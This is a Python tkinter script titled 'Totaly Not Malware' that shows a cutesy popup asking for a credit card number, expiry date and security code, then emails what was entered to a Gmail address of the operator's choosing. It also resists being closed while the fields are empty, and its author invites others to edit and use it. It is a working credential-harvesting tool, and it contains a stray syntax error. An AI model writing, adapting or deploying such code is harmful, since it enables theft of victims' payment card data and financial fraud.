# these need to be installed...

#type this into your terminal:
#==============================
# pip install tkinter = for the gui
# pip install PILLOW = for the image
#==============================

import tkinter as tk
from tkinter import messagebox
import smtplib
from PIL import Image, ImageTk
import re

def send_email(card_number, expiry_date, cvv):
    sender_email = "your_email@gmail.com"  # Replace with your email address
    sender_password = "your_password"  # Replace with your email password
    
    recipient_email = "your_recipient_email@gmail.com"  # Replace with the recipient email address
    subject = "Payment Information"
    message = f"Card Number: {card_number}\nExpiry Date: {expiry_date}\nCVV: {cvv}"
    
    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            email_body = f"Subject: {subject}\n\n{message}"
            server.sendmail(sender_email, recipient_email, email_body)

        succses message
        messagebox.showinfo("Success", "Payment successfully!\n Th- Thanks <3 ")
    except Exception as e:
        # error message
        messagebox.showerror("Error 404", f"Error 404 \nW- Woops, the software messed up... \n please try again UwU \n===============================\n \n\n\nT- To know what happened please read the text below...\n-------------------------------------------------------------------------\n{str(e)}")

# this send all the data to your recipent email
def submit():
    card_number = entry_card_number.get()
    expiry_date = entry_expiry_date.get()
    cvv = entry_cvv.get()

    if not card_number or not expiry_date or not cvv:
        messagebox.showwarning("U- Uhhh Ohhh, We r- ran into a er- error", "P- Pwease fill in all of the fields UwU")
        return

    send_email(card_number, expiry_date, cvv)

    messagebox.showinfo("", "Th- Thanks")
    # can add more code here to happen after the box "Th- Thanks" has been closed

def on_closing():
    if not entry_card_number.get() and not entry_expiry_date.get() and not entry_cvv.get():
        messagebox.showwarning("U- Uhhh Ohhh, We r- ran into a er- error", "P- Pwease Don't try to close this popup OwO")
    else:
        root.destroy()

def validate_input(input):
    return re.match(r'^[\d/]*$', input) is not None

root = tk.Tk()
root.title("Totaly Not Malware")
root.protocol("WM_DELETE_WINDOW", on_closing)

# label
text_label = tk.Label(root, text="H- Hi there...\nDo you th- think I could have your\ncredit card information, p- please", font=("Arial", 12))

# image
image = Image.open("image\image.png")
image = image.resize((150, 150), Image.ANTIALIAS)
photo = ImageTk.PhotoImage(image)

# Create the Labels
label_card_number = tk.Label(root, text="Card Number:", font=("Arial", 12))
label_expiry_date = tk.Label(root, text="Expiry Date:", font=("Arial", 12))
label_cvv = tk.Label(root, text="Security Code:", font=("Arial", 12))

# Create create Entry fields
validation = root.register(validate_input)
entry_card_number = tk.Entry(root, validate="key", validatecommand=(validation, '%P'))
entry_expiry_date = tk.Entry(root, validate="key", validatecommand=(validation, '%P'))
entry_cvv = tk.Entry(root, validate="key", validatecommand=(validation, '%P'))

# Create the Submit Button
submit_button = tk.Button(root, text="Th- thanks <3", command=submit)

# Layout
image_label = tk.Label(root, image=photo)
image_label.grid(row=0, column=0, rowspan=5, padx=10, pady=10, sticky="w")
text_label.grid(row=0, column=1, columnspan=2, padx=10, pady=(10, 0), sticky="w")
label_card_number.grid(row=1, column=1, padx=10, pady=2, sticky="e")
entry_card_number.grid(row=1, column=2, padx=10, pady=2, sticky="w")
label_expiry_date.grid(row=2, column=1, padx=10, pady=2, sticky="e")
entry_expiry_date.grid(row=2, column=2, padx=10, pady=2, sticky="w")
label_cvv.grid(row=3, column=1, padx=10, pady=2, sticky="e")
entry_cvv.grid(row=3, column=2, padx=10, pady=2, sticky="w")
submit_button.grid(row=4, column=1, padx=10, pady=(0, 10), sticky="e")

# Configure
root.grid_columnconfigure(3, weight=1)

root.mainloop()

# everything here is editable... please like and use to your likeing
